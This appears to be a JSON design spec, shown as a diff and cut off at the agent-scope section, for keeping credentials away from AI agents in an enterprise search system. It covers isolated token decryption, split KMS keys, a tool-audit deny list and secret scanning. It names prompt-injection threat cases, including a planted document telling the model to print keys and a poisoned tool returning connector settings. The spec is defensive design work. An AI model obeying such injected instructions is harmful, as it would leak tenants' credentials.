@@ -1,0 +1,998 @@
+{
+ "group": {
+  "line": "Tokens decrypt only in one connector process, admin and user tokens sit under separate keys, no tool exposes a credential, secrets are scanned out on the way in and out, agents get least scope without the lethal trifecta, and answers cannot fetch links.",
+  "dumb": "An agent that reaches someone's files must never be able to get a stored login. Logins are unlocked by one small program that agents cannot reach. Two kinds of logins use different keys. No tool shows a secret, secrets are cut out of text going in and coming out, each agent gets only what it needs, and answers cannot carry links or pictures that leak data."
+ },
+ "comps": {
+  "sc_runtime": {
+   "line": "Tokens decrypt only inside one connector process:\nno inbound tool port, no model call, short-lived access tokens out",
+   "dumb": "Stored app logins are locked. Only one small program, the connector runtime, can unlock them, and only when it is about to call an app. That program cannot be reached by any AI agent and cannot talk to a language model. It hands each app call a short-lived pass, never the stored login.",
+   "inn": "Decrypt request {tenant, connection_id, purpose} from the connector SDK (so_sdk) over a local socket. Ciphertext token record {tenant, connection_id, enc_refresh_token, key_ref} from the token vault (so_oauth).",
+   "out": "Short-lived access token {access_token, expires_at, audience} held in process memory only, passed to one connector call. Decrypt audit row {tenant, connection_id, key_ref, at} to the audit log.",
+   "store": "Nothing durable. Plaintext tokens live in process memory for at most the token lifetime and are never written to disk, logs, traces or the index. The ciphertext lives in the token vault.",
+   "fail": "If the KMS (key management service) call fails, retry at 200 ms, 1 s, 5 s, then mark the connection degraded and alert. If the process crashes, memory is lost and the next call decrypts again. If a refresh token is rejected (revoked or already used), stop calling that app, mark the connection needs_reauth and tell the admin within 5 min.",
+   "prop": "Proposal: an agent that can be tricked must not be able to reach a credential, so the only process that ever holds one has no way in from agents and no way to a model.",
+   "hard": "Process isolation strength (separate container, separate host, or an enclave) is a cost choice we have not measured. Memory scraping by an attacker with code execution on the same host is not stopped by this design. Check current docs for the chosen KMS and runtime sandbox options.",
+   "deep": {
+    "purpose": "Keep stored credentials away from every agent and every model. The connector runtime is the single process that decrypts a token, uses it for one app call and drops it. It listens on no network port for tools, has no route to the LLM gateway, and logs only key references. A new app joins through the connector manifest (so_sdk) or the MCP bridge (so_mcp); both go through this same runtime, so no new app adds a second place where tokens are decrypted.",
+    "expected": [
+     "Only the connector runtime identity can call decrypt on the token keys",
+     "An agent, MCP tool or model call can never trigger a decrypt, directly or by argument",
+     "Every decrypt leaves an audit row with a key reference and no token text"
+    ],
+    "not_expected": [
+     "It does not decide what a user may see; the permission filter (acl stage) does",
+     "It does not store tokens in plaintext anywhere, including logs and crash dumps",
+     "It does not refresh tokens for apps whose connection is marked revoked"
+    ],
+    "algorithm": {
+     "name": "Single-purpose decrypt process with no inbound tool surface and no model egress",
+     "formula": "exposure(token) = T_access + T_mem, where plaintext exists only from decrypt until the call ends",
+     "steps": [
+      "The SDK asks the runtime over a local Unix socket, identified by process credentials, for a token for {tenant, connection_id}",
+      "The runtime loads the ciphertext record and calls KMS decrypt with its own role; the role is allowed on the token keys and on nothing else",
+      "If the access token is missing or within 60 s of expiry, the runtime exchanges the refresh token with the app and stores the new ciphertext; single-use refresh tokens (Slack) are swapped in one transaction",
+      "The runtime attaches the access token to the one outbound app call, then zeroes the buffer",
+      "The runtime writes an audit row with key_ref and connection_id and never the token"
+     ],
+     "params": {
+      "expiry_margin": "60 s before expiry, refresh (design)",
+      "slack_access_token_life": "12 hours when rotation is on (x_sec_slack-rotation)",
+      "process_memory_only": "true, no swap file and core dumps disabled (design)",
+      "network_policy": "allow only KMS, token vault and the app hosts of active connectors; deny the LLM gateway (design)"
+     }
+    },
+    "math": {
+     "definitions": [
+      "T_access: lifetime of an access token",
+      "T_mem: time the plaintext buffer stays in memory after the call",
+      "exposure: window in which a stolen process memory image holds a usable token"
+     ],
+     "formula_full": "exposure = T_access + T_mem, with T_mem near 0 because the buffer is zeroed after the call",
+     "derivation": "An attacker who reads memory gets only what is in memory. A refresh token can mint new access tokens, so it is decrypted only inside the refresh step and not kept; the long-lived secret stays encrypted at rest. What remains useful is the current access token for its remaining life.",
+     "worked_example": "Slack with rotation on: access token lives 12 h. Worst case exposure of one stolen memory image = 12 h of one connection, and the refresh token is single-use so a copy used by the attacker breaks our next refresh and raises an alert. For an app with 1 h tokens the window is 1 h.",
+     "complexity": "O(1) per call: one KMS decrypt and at most one refresh round trip. Cache the plaintext access token for its lifetime, so decrypts per hour per connection are at most 1 to 2.",
+     "failure_modes": [
+      "Plaintext leaks into logs through an exception message: log scrubbing plus a unit test that greps the log for token-shaped strings (sc_scan rules)",
+      "Core dump captures memory: disable core dumps for the process",
+      "Two refreshes race and burn a single-use refresh token: per-connection lock around the exchange"
+     ],
+     "calibration": "Pick the refresh margin from observed app clock skew: set it at the p99 skew plus 30 s, start with 60 s. Review decrypts per connection per hour weekly; a jump above 10x its median pages security. (design)"
+    },
+    "alternatives": [
+     {
+      "name": "Hand the access token to the agent so it can call the app itself",
+      "why_rejected": "Any prompt injection that reaches the agent can then read it. MCP also forbids passing tokens through (x_sec_mcp-sec)."
+     },
+     {
+      "name": "A third-party token vault service that returns provider tokens to the calling app (Auth0 Token Vault pattern)",
+      "why_rejected": "Good fit for an app-side agent, but it moves the decrypt boundary outside our own process and only the page summary was verified (x_sec_auth0-vault). Check current docs before adopting."
+     }
+    ],
+    "security": [
+     "Prompt injection that tries to read a token (OWASP LLM02 Sensitive Information Disclosure and LLM06 Excessive Agency): the runtime has no inbound tool port, so no model-reachable path to it exists",
+     "Token exfiltration through a compromised connector library: the runtime network policy allows only KMS, the vault and active app hosts, so an outbound copy to another host is blocked",
+     "Confused deputy (MCP security best practices): the runtime only attaches a token whose audience matches the app host in the call, and refuses to forward a token it received from a client"
+    ],
+    "performance": {
+     "slo": "Token ready in p95 under 15 ms from cache, under 120 ms when a KMS decrypt is needed (design)",
+     "complexity": "O(1) per call; one KMS decrypt per cache miss",
+     "scaling": "At 10x connections, decrypts grow with cache misses, not with query volume. Run several runtime replicas; each keeps its own cache, so KMS request rate is the cost to watch."
+    },
+    "edge_cases": [
+     "Refresh token revoked at the app: connection moves to needs_reauth, calls stop, admin is told",
+     "Slack single-use refresh token used twice by a race: the lock makes the second caller reuse the new token",
+     "KMS region outage: calls fail closed; cached unexpired access tokens keep serving until expiry",
+     "Tenant is being purged: the kill switch denies decrypt for that tenant before any other step",
+     "A new app arriving through the connector manifest (so_sdk) or MCP bridge (so_mcp) uses the same socket and the same role; the manifest declares only the auth type, never a place to store a secret",
+     "Process restart during a refresh: the ciphertext write is transactional, so either the old or the new token is intact"
+    ],
+    "tests": [
+     {
+      "name": "no inbound surface",
+      "given": "scan listening ports of the runtime container",
+      "expect": "no open TCP port; only the local socket accepts requests"
+     },
+     {
+      "name": "no model route",
+      "given": "try to reach the LLM gateway host from the runtime",
+      "expect": "connection refused by network policy"
+     },
+     {
+      "name": "log hygiene",
+      "given": "run 1,000 calls with debug logging",
+      "expect": "zero token-shaped strings in logs, traces and crash output"
+     },
+     {
+      "name": "refresh race",
+      "given": "two calls need a refresh at the same moment for a single-use refresh token",
+      "expect": "one exchange happens; both calls succeed; no needs_reauth"
+     }
+    ],
+    "cost_levers": [
+     "Cache the access token for its lifetime to cut KMS decrypts to about 1 to 2 per hour per connection",
+     "One runtime pool per region instead of per tenant"
+    ],
+    "feedback_events": [
+     "Every needs_reauth event is reviewed weekly to find apps whose refresh tokens expire early",
+     "Any decrypt outside the runtime role (denied by KMS) is a security incident"
+    ],
+    "analytics_events": [
+     {
+      "name": "token.decrypt",
+      "fields": [
+       "tenant_id",
+       "connection_id",
+       "key_ref",
+       "cache_hit",
+       "ms"
+      ],
+      "when": "on each decrypt"
+     },
+     {
+      "name": "token.refresh",
+      "fields": [
+       "tenant_id",
+       "connection_id",
+       "ok",
+       "ms"
+      ],
+      "when": "on each refresh exchange"
+     },
+     {
+      "name": "token.needs_reauth",
+      "fields": [
+       "tenant_id",
+       "connection_id",
+       "reason"
+      ],
+      "when": "when a refresh is rejected"
+     }
+    ],
+    "papers": [
+     {
+      "ref": "p_indirect-injection",
+      "key_idea": "Text fetched into an LLM application can carry instructions that steer it.",
+      "how": "We assume the agent can be steered, so no credential is within its reach."
+     }
+    ],
+    "repos": [],
+    "industry": "Glean says OAuth is the preferred path for per-user integrations (x_sec_glean-auth). Auth0 Token Vault stores provider tokens and hands out access tokens by exchange (x_sec_auth0-vault); our version keeps the decrypt inside a process we run.",
+    "refs": [
+     "x_sec_mcp-sec",
+     "x_sec_mcp-auth",
+     "x_sec_slack-rotation",
+     "x_sec_owasp-llm",
+     "x_sec_owasp-llm06",
+     "x_sec_auth0-vault",
+     "x_sec_glean-auth",
+     "p_indirect-injection"
+    ]
+   },
+   "req": "not in any research source"
+  },
+  "sc_split": {
+   "line": "Admin app-only tokens and per-user tokens use different KMS keys and roles:\nneither role can read the other",
+   "dumb": "The brain holds two kinds of logins. Admin logins let it read a whole company's data. User logins let it read what one person can see. We lock the two kinds with different keys and give them different roles. Someone who steals one kind still cannot open the other.",
+   "inn": "Wrap and unwrap requests {tenant, token_class: admin|user, connection_id} from the token vault (so_oauth). Key policy files from infrastructure code.",
+   "out": "Data keys wrapped under the key for the right class, via the tenant key service (gv_kms). Denied-access events {role, key_ref, op} to the audit log.",
+   "store": "Two KMS keys per tenant (admin class, user class) and two roles. Key policies are code in the infrastructure repo. Nothing else is stored here.",
+   "fail": "If the admin key is unavailable, admin-token syncs pause and user-token queries continue; the reverse also holds. A denied cross-class call is logged and pages security after 3 in 10 min. Key policy drift found by the nightly check is repaired within 1 h or paged.",
+   "prop": "Proposal: admin app-only grants (for example Entra tenant-wide consent or Google domain-wide delegation) reach every user's data, so they need a separate lock from per-user tokens.",
+   "hard": "Whether to also split by connector (one key per app) is open; it cuts blast radius but multiplies keys. Cloud KMS pricing and key policy syntax: check current docs.",
+   "deep": {
+    "purpose": "Limit what one stolen role or key can open. Admin app-only tokens act for a whole company: Entra admin consent covers the whole org (x_sec_entra-consent) and Google domain-wide delegation covers every user in the domain (x_sec_google-dwd). Per-user tokens act for one person. Each class gets its own KMS key and its own role, and each role is denied on the other's key. A new app joins through the connector manifest (so_sdk) and only declares which class its auth uses.",
+    "expected": [
+     "The user-token role cannot decrypt anything wrapped under the admin key",
+     "The admin-token role cannot decrypt anything wrapped under the user key",
+     "Each key use is attributable to one role in the audit log"
+    ],
+    "not_expected": [
+     "It does not encrypt document content; the brain stores none",
+     "It does not rotate app tokens; the runtime handles refresh",
+     "It does not replace tenant keys (gv_kms); each class key is per tenant"
+    ],
+    "algorithm": {
+     "name": "Two-class key separation with explicit deny",
+     "formula": "blast(role) = number of tokens whose key policy allows that role to decrypt",
+     "steps": [
+      "At connect time the connector manifest states token_class: admin or user",
+      "Wrap the data key under the tenant's key for that class only",
+      "Key policy for the admin key allows only the admin-sync role; policy for the user key allows only the user-query role; each has an explicit deny for everyone else",
+      "Nightly: read back every key policy and compare to the repo; any difference pages",
+      "Cross-class attempts are logged with role and key_ref"
+     ],
+     "params": {
+      "classes": "2 (admin, user)",
+      "keys_per_tenant": "2 (design)",
+      "policy_drift_check": "every 24 h (design)",
+      "alert_threshold": "3 denied cross-class calls in 10 min (tune from baseline)"
+     }
+    },
+    "math": {
+     "definitions": [
+      "A: admin-class tokens in a tenant",
+      "U: user-class tokens in a tenant",
+      "blast(role): tokens readable by that role"
+     ],
+     "formula_full": "shared key: blast = A + U for either role; split keys: blast(admin role) = A and blast(user role) = U",
+     "derivation": "With one key, any role allowed on it can open everything under it. With two keys and disjoint role grants, each role's reach is only its own class, so a breach of one role shrinks reach by the size of the other class.",
+     "worked_example": "A tenant with 1 admin token and 800 user tokens. Shared key: a stolen role opens 801. Split: stolen admin role opens 1; stolen user role opens 800 and no admin token, which is the one that reads all mailboxes.",
+     "complexity": "O(1) per wrap or unwrap; policy check is one KMS call.",
+     "failure_modes": [
+      "A convenience role is granted both keys: the nightly policy diff finds it",
+      "An admin token is created with the user class by mistake: manifest validation rejects a connector whose declared class does not match its grant type",
+      "Key policy edited by hand in the console: drift check reverts and pages"
+     ],
+     "calibration": "Start with two keys per tenant. Move to per-connector keys only if one connector's tokens are more than half the tenant's blast radius or a customer asks."
+    },
+    "alternatives": [
+     {
+      "name": "One key per tenant for all tokens",
+      "why_rejected": "One role compromise opens admin and user tokens together."
+     },
+     {
+      "name": "One key per connector",
+      "why_rejected": "Smaller blast radius but many more keys and policies; kept as a later option for large tenants."
+     }
+    ],
+    "security": [
+     "Compromised user-query service tries to decrypt an admin token to read a whole mailbox set: explicit deny on the admin key, logged and paged",
+     "Insider grants themselves both roles: role grants are code-reviewed and the nightly diff compares live policy to the repo",
+     "Confused deputy at the connector: the class is fixed by the manifest, so an agent argument cannot pick the admin class"
+    ],
+    "performance": {
+     "slo": "Wrap or unwrap p95 under 40 ms (design)",
+     "complexity": "O(1) per call",
+     "scaling": "Key count grows 2 per tenant; at 10,000 tenants that is 20,000 keys, so check KMS quotas and prices in current docs before the tenant count passes 1,000."
+    },
+    "edge_cases": [
+     "Tenant with no admin-class connector: admin key created lazily at first use",
+     "Connector that supports both grants: two connections, one per class, never mixed",
+     "Admin consent revoked at the app: admin token is useless; its record is marked revoked and kept for audit",
+     "Key scheduled for deletion: refused while any token record references it",
+     "A new app declares token_class in its manifest (so_sdk); an MCP bridge connection (so_mcp) is always user class",
+     "Region move of a tenant: both keys are re-created in the new region and tokens re-wrapped in one transaction"
+    ],
+    "tests": [
+     {
+      "name": "cross-class deny",
+      "given": "user role calls decrypt on an admin-wrapped data key",
+      "expect": "access denied, audit row written"
+     },
+     {
+      "name": "reverse deny",
+      "given": "admin role calls decrypt on a user-wrapped data key",
+      "expect": "access denied, audit row written"
+     },
+     {
+      "name": "policy drift",
+      "given": "edit the live policy to add a role to both keys",
+      "expect": "nightly check pages and reverts within 1 h"
+     },
+     {
+      "name": "wrong class manifest",
+      "given": "register a connector declaring user class with an app-only grant",
+      "expect": "registration rejected"
+     }
+    ],
+    "cost_levers": [
+     "Two keys per tenant is the minimum; create the admin key only when the first admin-class connection appears"
+    ],
+    "feedback_events": [
+     "Each denied cross-class call is reviewed; repeated ones point to a code bug that picks the wrong role"
+    ],
+    "analytics_events": [
+     {
+      "name": "key.denied",
+      "fields": [
+       "tenant_id",
+       "role",
+       "key_ref",
+       "op"
+      ],
+      "when": "on any denied key call"
+     },
+     {
+      "name": "key.policy_drift",
+      "fields": [
+       "tenant_id",
+       "key_ref",
+       "diff_size"
+      ],
+      "when": "when the nightly check finds a change"
+     }
+    ],
+    "papers": [],
+    "repos": [],
+    "industry": "Entra admin consent grants permissions for the whole org (x_sec_entra-consent) and Google domain-wide delegation reaches all users in a domain and takes up to 24 hours to change (x_sec_google-dwd). Both are the admin class here.",
+    "refs": [
+     "x_sec_entra-consent",
+     "x_sec_google-dwd",
+     "x_sec_owasp-llm06",
+     "x_sec_owasp-llm",
+     "x_sec_mcp-sec"
+    ]
+   },
+   "req": "not in any research source"
+  },
+  "sc_noconf": {
+   "line": "The tool list has no tool that returns, lists or edits a credential or setting:\na build test lists every tool and fails on a match",
+   "dumb": "An agent can only do what its tools allow. So we make sure no tool exists that could show a password, a login or a connection setting. A test reads the full tool list every time we build. If a tool that touches secrets ever shows up, the build fails and nothing ships.",
+   "inn": "The full tool registry (names, descriptions, argument schemas, output schemas) from the tool contract (ll_schema), read at build time and again at server start.",
+   "out": "Pass or fail for the build and for server start, with the offending tool name and the rule it broke. A tool-audit report artifact for each release.",
+   "store": "A deny rule file (name patterns, argument-name patterns, output-field patterns) in the repo and the last audit report. No runtime data.",
+   "fail": "On a failing audit the build stops and the release is blocked. At server start, a failing audit makes the server refuse to boot (fail closed) and page within 1 min. A flaky audit is not retried; a human reads it.",
+   "prop": "Proposal: the safest credential tool is the one that does not exist. If no tool can return or change a secret, a tricked agent cannot ask for one.",
+   "hard": "Name patterns can be dodged by a tool with an innocent name that returns a config blob. The audit also checks output schemas and runs a canary secret through every tool, but a custom tool added by a customer through a plugin is outside this test unless the plugin runs the same audit.",
+   "deep": {
+    "purpose": "Remove the credential attack path at its source. The MCP tool list is the agent's whole reach. The audit proves that no tool name, argument or output field can return, list or edit a token, key, client secret, webhook secret or connector setting. It maps to OWASP LLM06 Excessive Agency: minimal tools and no excess functionality (x_sec_owasp-llm06). A new app joins through the connector manifest (so_sdk) or the MCP bridge (so_mcp); neither can register an agent tool, and admin configuration is a separate human-only interface.",
+    "expected": [
+     "The registered tool list contains no credential or configuration tool",
+     "A tool whose output schema has a secret-like field fails the audit",
+     "The audit runs in CI and again at server start"
+    ],
+    "not_expected": [
+     "It does not stop a tool from returning document text that happens to contain a secret; the scanner (sc_scan) does",
+     "It does not review tool descriptions for prompt injection; that is a separate tool-poisoning review",
+     "It does not cover the admin console; that surface is human-only and behind single sign-on"
+    ],
+    "algorithm": {
+     "name": "Deny-list tool audit with output-schema check and canary secret probe",
+     "formula": "pass iff for every tool t: no deny_name(t) and no deny_arg(t) and no deny_field(t) and canary not in output(t)",
+     "steps": [
+      "Load the tool registry with names, argument schemas and output schemas",
+      "Match each name, argument name and output field name against the deny patterns (secret, token, credential, password, key, config, setting, client_secret, webhook, refresh)",
+      "Match allow-listed exceptions only from an explicit file reviewed by two people",
+      "Run each read tool against a test tenant that holds a planted canary secret in its config and in a document; fail if the canary appears in any output",
+      "Write the audit report and exit non-zero on any hit"
+     ],
+     "params": {
+      "deny_patterns": "secret, token, credential, password, key, config, setting, webhook, refresh (design; extend from incidents)",
+      "canary": "a random 32-character value planted per audit run (design)",
+      "exceptions_file": "requires 2 reviewers (design)"
+     }
+    },
+    "math": {
+     "definitions": [
+      "T: set of registered tools",
+      "D: deny patterns",
+      "f(t): set of names in t (tool, arguments, output fields)"
+     ],
+     "formula_full": "pass iff for all t in T: f(t) intersect D is empty and canary not in output(t)",
+     "derivation": "The audit is a universal check over a finite set, so one match is enough to fail. The canary probe catches what name matching cannot: a tool with a harmless name that still returns a secret.",
+     "worked_example": "Registry of 9 tools: search, fetch, list_sources, ask, explain_access, get_doc, whoami, feedback, health. Check names against 9 patterns: 0 hits. A tenth tool named get_connector_settings is added: hit on config and setting, build fails with that tool named.",
+     "complexity": "O(|T| x |D|) pattern checks plus |T| canary calls; under 5 s for 50 tools.",
+     "failure_modes": [
+      "Harmless name hides a secret in the output: the canary probe fails it",
+      "Over-broad pattern blocks a legitimate tool named key_facts: the exceptions file with two reviewers handles it",
+      "Tool added only at runtime by a plugin: the start-up audit re-runs on the live registry"
+     ],
+     "calibration": "After each release add any false positive to the exceptions file and any miss found in review to the deny patterns. Keep the exceptions list under 5 entries; more than that means the patterns are too broad."
+    },
+    "alternatives": [
+     {
+      "name": "Hide credential tools behind an admin-only scope",
+      "why_rejected": "A scope can be mis-granted or confused. A tool that does not exist cannot be called."
+     },
+     {
+      "name": "Rely on the model to refuse requests for secrets",
+      "why_rejected": "The lethal-trifecta guidance says guardrails are not a reliable fix (x_sec_trifecta)."
+     }
+    ],
+    "security": [
+     "Tool poisoning or a plugin adds get_config: start-up audit refuses to boot with it",
+     "Prompt injection asks the agent to print its connection settings (OWASP LLM02 Sensitive Information Disclosure): no tool exists that returns them",
+     "An output schema gains a field named client_secret by accident: the field-name check fails the build"
+    ],
+    "performance": {
+     "slo": "Audit finishes in under 10 s in CI and under 2 s at start-up (design)",
+     "complexity": "O(|T| x |D|) plus |T| probes",
+     "scaling": "Tool count grows slowly. At 10x tools the audit still runs in under a minute; the cost is reviewer time on the exceptions file."
+    },
+    "edge_cases": [
+     "A tool named list_keys that lists search keywords: needs an exception reviewed by two people",
+     "Tool description mentions 'token' as a word: descriptions are not matched, only names and schemas, to avoid noise",
+     "Plugin registers a tool at runtime: the live-registry audit blocks it and pages",
+     "A new connector arrives through the connector manifest (so_sdk) or MCP bridge (so_mcp): it adds no agent tool, so the audit result does not change",
+     "Empty tool list: audit passes but a separate test requires at least the search tool",
+     "Argument named 'resource' (RFC 8707 parameter) is not a secret: the name is not on the deny list"
+    ],
+    "tests": [
+     {
+      "name": "clean list",
+      "given": "registry with the 9 shipped tools",
+      "expect": "audit passes, report lists 9 tools"
+     },
+     {
+      "name": "name hit",
+      "given": "add a tool named get_connector_settings",
+      "expect": "build fails naming that tool and the pattern"
+     },
+     {
+      "name": "hidden secret",
+      "given": "tool named summarize that returns the tenant config blob",
+      "expect": "canary found in output, build fails"
+     },
+     {
+      "name": "runtime plugin",
+      "given": "register a tool after start-up",
+      "expect": "live audit blocks it and pages within 1 min"
+     }
+    ],
+    "cost_levers": [
+     "The audit is plain code with no model call; the canary run uses a small test tenant"
+    ],
+    "feedback_events": [
+     "Each false positive or miss is added to the patterns file with the release that found it"
+    ],
+    "analytics_events": [
+     {
+      "name": "toolaudit.run",
+      "fields": [
+       "release",
+       "n_tools",
+       "n_hits",
+       "ms"
+      ],
+      "when": "at each build and each server start"
+     },
+     {
+      "name": "toolaudit.blocked",
+      "fields": [
+       "tool",
+       "rule"
+      ],
+      "when": "when a tool is refused"
+     }
+    ],
+    "papers": [],
+    "repos": [
+     {
+      "ref": "x_sec_gitleaks",
+      "name": "gitleaks",
+      "take": "Its rule style (TOML pattern rules, allow lists) is the model for the deny patterns file."
+     }
+    ],
+    "industry": "OWASP LLM06 lists minimal tools and narrow read-only extensions as the control for excessive agency (x_sec_owasp-llm06). Claude connectors let owners set each tool to Always allow, Needs approval or Blocked (pr_claude-connectors); we go further and ship no credential tool at all.",
+    "refs": [
+     "x_sec_owasp-llm06",
+     "x_sec_owasp-llm",
+     "x_sec_trifecta",
+     "x_sec_gitleaks",
+     "pr_claude-connectors"
+    ]
+   },
+   "req": "not in any research source"
+  },
+  "sc_scan": {
+   "line": "Gitleaks-style rules plus Shannon entropy scan each chunk before indexing\nand each answer before it leaves: mask in index, block in output",
+   "dumb": "Before text is turned into search data, and again before an answer is sent, we look for things that look like passwords and keys. Some have a known shape, like a cloud key prefix. Others are just long random-looking strings. Anything found is masked or the answer is held back, so a secret that sits in a document never reaches the index or the reader.",
+   "inn": "Chunk text {tenant, doc_id, chunk_id, text} from the derive stage before embedding. Answer text {tenant, query_id, text} from the result envelope (ll_fmt) before it is returned. Shared rule set from on-device redaction (cp_redact).",
+   "out": "Cleaned text with each hit replaced by [SECRET:rule_id]; finding record {tenant, doc_id|query_id, rule_id, offset_start, offset_end, action} with no secret text; block verdict for answers with an unmasked critical hit.",
+   "store": "Rule file (TOML) versioned in the repo. Findings table {tenant, source_id, rule_id, count, at}. The secret text is never stored.",
+   "fail": "If the scanner crashes on a chunk, the chunk is not indexed (fail closed) and retried at 1 min, 5 min, 30 min, then sent to the dead-letter queue. If it crashes on an answer, the answer is withheld and the caller gets a generic error. Scan time limit is 50 ms per 4 KB; on timeout treat as a hit.",
+   "prop": "Proposal: a secret that sits in a wiki page or chat must not end up in the search index or in an answer, so the same rules run on the way in and on the way out.",
+   "hard": "Rule sets miss new key formats and flag random-looking but harmless text such as hashes; both rates are not yet measured on real tenant data. gitleaks is in maintenance mode and its maintainer is moving to Betterleaks (x_sec_gitleaks), so the rule format may need a new engine. Presidio and trufflehog were not verified: check current docs.",
+   "deep": {
+    "purpose": "Stop credentials in company content from being indexed or shown. Many documents hold pasted keys and tokens. A pattern rule finds known shapes. An entropy check finds unknown random strings. The same rule set runs before embedding (so the vector and snippet never hold the secret) and on each answer before it leaves (so the model cannot echo one). A new app needs no change: any connector output (so_sdk) or MCP bridge result (so_mcp) is chunked the same way and scanned at the same step.",
+    "expected": [
+     "Known-shape secrets (cloud keys, tokens, private key blocks) are masked in chunks and blocked in answers",
+     "High-entropy strings next to a keyword such as password or token are flagged",
+     "Findings carry rule id and position, never the secret"
+    ],
+    "not_expected": [
+     "It does not find personal data; the sensitivity classifier (ix_pii) does",
+     "It does not prove the absence of secrets; it lowers the chance",
+     "It does not rewrite the source document; the source app is untouched"
+    ],
+    "algorithm": {
+     "name": "Regex rule set with keyword gating and Shannon entropy threshold",
+     "formula": "H(s) = -sum_c p(c) log2 p(c); flag s if a rule regex matches, or if len(s) >= 20 and H(s) >= threshold(charset)",
+     "steps": [
+      "Split text into candidate tokens (runs of 20 or more characters from letters, digits, plus, slash, equals, dash, underscore)",
+      "Run each rule regex (known key shapes, private key header and footer, connection strings); a match is a hit",
+      "For tokens without a rule hit, compute Shannon entropy over the token; flag if at or above the threshold for its character set and a keyword (key, secret, token, password) appears within 40 characters before it",
+      "Decode base64 and hex tokens once and rescan the result (gitleaks supports decoding, x_sec_gitleaks)",
+      "Apply allow-list entries (known test values, hashes with a hash label); replace hits with [SECRET:rule_id]",
+      "On the answer path, any remaining critical hit blocks the answer instead of masking"
+     ],
+     "params": {
+      "min_len": "20 characters (tune: start here, sweep 16 to 32 on labelled data)",
+      "entropy_hex": "3.0 bits per character (tune on labelled data)",
+      "entropy_base64": "4.5 bits per character (tune on labelled data)",
+      "keyword_window": "40 characters (design)",
+      "rules_source": "gitleaks style TOML rules (x_sec_gitleaks)"
+     }
+    },
+    "math": {
+     "definitions": [
+      "s: a candidate token",
+      "p(c): share of character c in s",
+      "H(s): Shannon entropy in bits per character",
+      "charset: hex (16 symbols, max 4.0), base64 (64 symbols, max 6.0)"
+     ],
+     "formula_full": "H(s) = - sum over distinct characters c of p(c) * log2 p(c); max H = log2(alphabet size)",
+     "derivation": "A random string over an alphabet of size n has entropy near log2(n) per character. Words and repeated patterns sit well below it. So a threshold a little under log2(n) separates random keys from prose and identifiers.",
+     "worked_example": "Token 'aaaaaaaaaaaaaaaaaaaa' (20 chars, one symbol): H = 0. Token 'abcdefghijklmnopqrst' (20 distinct characters): each p = 1/20, H = log2(20) = 4.32, above the hex threshold 3.0 and below the base64 threshold 4.5. A random 40-character base64 key: about 5.2 observed (design estimate), above 4.5, so flagged when a keyword is near.",
+     "complexity": "O(n) in text length for entropy; regex rules O(n x r) for r rules, with r about 100; about 1 ms per 4 KB chunk. (design)",
+     "failure_modes": [
+      "Git commit hashes and UUIDs flagged as secrets: allow-list by label and shape",
+      "Secret split across two chunks: scan the overlap region and run the output scan on the whole answer",
+      "Secret hidden by base64 or hex: one decode pass; deeper encodings are a known gap"
+     ],
+     "calibration": "Label 500 chunks per rule family (hits and clean). Choose the threshold that gives 95% recall at the lowest false-positive rate, then re-run monthly. A false-positive rate above 2% of chunks means the threshold or the allow list needs work. (design)"
+    },
+    "alternatives": [
+     {
+      "name": "Regex rules only",
+      "why_rejected": "Misses custom internal tokens that have no known shape."
+     },
+     {
+      "name": "Entropy only",
+      "why_rejected": "Flags hashes, IDs and compressed data; with no keyword gating the false-positive rate is too high."
+     },
+     {
+      "name": "A language model judge on every chunk",
+      "why_rejected": "Slow and costly at index volume, and the judge itself reads the secret."
+     }
+    ],
+    "security": [
+     "A secret pasted in a chat message is embedded and later shown in an answer (OWASP LLM02 Sensitive Information Disclosure): masked before embedding, blocked on output",
+     "An attacker plants a document that asks the model to print any key it sees: the output scan blocks the answer even if the model complies",
+     "Embedding inversion (x_sec_vec2text): a secret in a vector can be recovered, so the scan runs before embedding and not after",
+     "Rule file tampering: rules are versioned in the repo and changes need review"
+    ],
+    "performance": {
+     "slo": "Scan p95 under 5 ms per 4 KB chunk and under 10 ms per answer (design)",
+     "complexity": "O(n) text length times rule count",
+     "scaling": "Stateless and parallel. At 10x ingest the cost is CPU for regex; compile rules once per process and skip chunks with no 20-character token."
+    },
+    "edge_cases": [
+     "Private key block spanning many lines: rule matches the header and masks through the footer",
+     "Secret in a code block or table cell: scan operates on plain text after parsing",
+     "Document that legitimately documents key formats: the allow list carries the example values",
+     "Rule set updated: a re-scan job for already indexed chunks runs in the backfill lane",
+     "Connector output from a new app (so_sdk or so_mcp) goes through the same scan step, so nothing app-specific is needed",
+     "Scanner timeout: treat as a hit and withhold"
+    ],
+    "tests": [
+     {
+      "name": "known key shape",
+      "given": "chunk contains a string with a known cloud key prefix and valid length",
+      "expect": "masked as [SECRET:rule_id], finding row has no secret text"
+     },
+     {
+      "name": "entropy near keyword",
+      "given": "'password: ' followed by a random 32-character base64 token",
+      "expect": "flagged by entropy, masked"
+     },
+     {
+      "name": "clean prose",
+      "given": "1,000 chunks of ordinary documentation",
+      "expect": "false-positive rate under 2%"
+     },
+     {
+      "name": "output block",
+      "given": "model answer that echoes a planted canary key",
+      "expect": "answer withheld, finding written, caller gets generic error"
+     }
+    ],
+    "cost_levers": [
+     "No model call; skip entropy checks on chunks that have no token of 20 or more characters",
+     "Share the rule set with on-device redaction (cp_redact) so rules are maintained once"
+    ],
+    "feedback_events": [
+     "A user report of a missed secret becomes a new rule and a labelled test; a false positive goes to the allow list"
+    ],
+    "analytics_events": [
+     {
+      "name": "secret.found",
+      "fields": [
+       "tenant_id",
+       "rule_id",
+       "path",
+       "action"
+      ],
+      "when": "on each hit, path is index or output"
+     },
+     {
+      "name": "secret.blocked_answer",
+      "fields": [
+       "tenant_id",
+       "query_id",
+       "rule_id"
+      ],
+      "when": "when an answer is withheld"
+     },
+     {
+      "name": "secret.scan_ms",
+      "fields": [
+       "path",
+       "bytes",
+       "ms"
+      ],
+      "when": "per scan"
+     }
+    ],
+    "papers": [],
+    "repos": [
+     {
+      "ref": "x_sec_gitleaks",
+      "name": "gitleaks",
+      "take": "TOML rule format, stdin scanning, baselines and base64/hex decoding; adopt the rule style, watch the maintenance status."
+     }
+    ],
+    "industry": "Entire redacts secrets in stored agent sessions (x_prod_entire). Microsoft Recall turned on sensitive-information filtering by default after its first preview was pulled (x_sec_recall-ms).",
+    "refs": [
+     "x_sec_gitleaks",
+     "x_sec_owasp-llm",
+     "x_sec_vec2text",
+     "x_prod_entire",
+     "x_sec_recall-ms"
+    ]
+   },
+   "req": "not in any research source"
+  },
+  "sc_scope": {
+   "line": "Each agent has a scope set the policy engine checks on every call:\nnever private data + untrusted input + outbound channel together",
